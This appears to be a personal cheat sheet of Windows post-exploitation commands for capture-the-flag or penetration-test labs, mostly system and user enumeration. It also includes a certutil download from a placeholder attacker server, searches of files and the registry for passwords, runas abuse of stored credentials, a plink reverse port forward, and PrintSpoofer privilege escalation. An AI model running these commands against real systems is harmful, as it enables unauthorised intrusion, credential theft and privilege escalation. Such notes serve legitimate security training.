# Regular windows commands

```bash
# get current username
whoami

# get system information
systeminfo

# wget for windows
certutil -urlcache -f http://iamserver:port/xxxx.exe xxxx.exe

# grep() for os name
systeminfo | findstr /C:"OS Name"

# locate() for files
findstr /si password *.txt *.ini *.config *.xml *.bat

# locate *.exe's
dir /s /b *.exe
where *.exe

# get the hostname
hostname

# know the priviledges we have
# token impresonate attacks can be donw with this privs
whoami /priv

# know all the users in the machine
net user 

# Obtain information about the specific user
net user <username>

# Obtain users belongs to a specific groups
# users belonging to the sudo groups
net localgroup administrators / <group name>

# get to know network
ipconfig
ipconfig /all

# internal network services
netstat -ano 

# get to know antivirus
sc query windefend	#know about windows defender status (up / down)
sc queryex type= service #brings all the running services in the machine

# get to know about the firewall 
netsh show firewall state

# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s

# port forward using plink.exe -l user -pw password for the user 
plink -l root -pw <pass> -R PORT:127.0.0.1:PORT 10.10.x.x

# search for binaries in the machine, like whereis in linux
# rn searching for powershell.exe in C:\Window\System32
where /R C:\windows\System32 powershell.exe

# look for stored credentials in the machine
cmdkey /list 

# run as commands, when the creds for the user is stored which can be confirmed with cmdkey /list
runas.exe /user:domain\UserName /savecred "C:\Windows\System32\cmd.exe /c Type C:\Users\UserName\Desktop\(user|root).txt > C:\Users\lowUser\root.txt"

# if SeImpersonate Priviledges is available, use Printspoof
# https://github.com/itm4n/PrintSpoofer
PrintSpoofer.exe -i -c cmd
```
